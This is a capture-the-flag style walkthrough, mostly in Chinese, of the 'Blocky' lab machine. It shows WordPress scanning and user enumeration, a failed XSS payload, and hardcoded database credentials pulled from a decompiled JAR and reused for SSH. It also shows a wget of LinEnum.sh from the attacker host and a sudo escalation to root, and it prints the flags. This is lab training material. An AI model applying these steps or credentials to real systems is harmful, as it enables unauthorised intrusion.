[toc]
# Blocky
- victim
	- 10.129.64.192
- local
	- 10.10.14.34
	- 10.10.14.12
- [ ] AutoRecon已执行？

---

## Web分析(port 80)

一眼看上去就是WordPress，扫一下，现在需要api了，连接api一下并写入alias

```bash
wpscan --url http://10.129.64.192
wpscan --url http://10.129.64.192 --enumerate u
```

结果保存在`wpscan.pdf`

扫出来版本漏洞好多，

- SQL注入：WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
  - CVE-2017-14723
  - CVE介绍里表示需要必须要利用插件进行SQL注入攻击，那看来没法直接利用
- XSS：WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
  - HttpOnly未打开，可能存在CSRF
  - 但未登录前没有上传点，这个也GG
- XSS：WordPress 3.9-5.1 - Comment Cross-Site Scripting
  - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/ 符合我的思路CSRF To RCE

### 用户枚举结果

根据用户枚举结果，通过http://10.129.64.192/index.php/wp-json/wp/v2/users/?per_page=100&page=1可以直接获取到用户信息，有且只有一个用户

用户名：Notch / notch

### XSS攻击

Payload

```html
<img title='XSS " src="dwafwadaw" onerror="document.write(123)" id=" '>
```

没成功

### 路径扫描

在http://10.129.64.192/plugins/ 发现有一个文件浏览系统，包含了两个jar文件，很有意思，拿下来反编译看看

## Jar文件反编译

使用JD-GUI

### BlockyCore.jar

找到硬编码的Sql用户

- sqlUser
  - root
- sqlPass
  - 8YsqfCTnvxAUeduzjNSXe22

### griefprevention-1.11.2-3.1.1.298.jar

代码很多，无明显有用代码

尝试ssh口令复用,`Notch`不可用，尝试`notch`，成功登陆ssh

- user:notch
- Pass:8YsqfCTnvxAUeduzjNSXe22

`user.txt`

```
59fee0977fb60b8a0bc6e41e751f3cd5
```

## Priv Escalation to Root

LinEnum检查

```bash
wget 10.10.14.34:8000/LinEnum.sh
```

To `LinEnum.pdf`

可以看见又是sudoer又是adm

```bash
sudo -l
```

```
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

```bash
sudo -i
```

直接成为了root

`root.txt`

```
0a9694a5b4d272c694679f7860f1cd5f
```

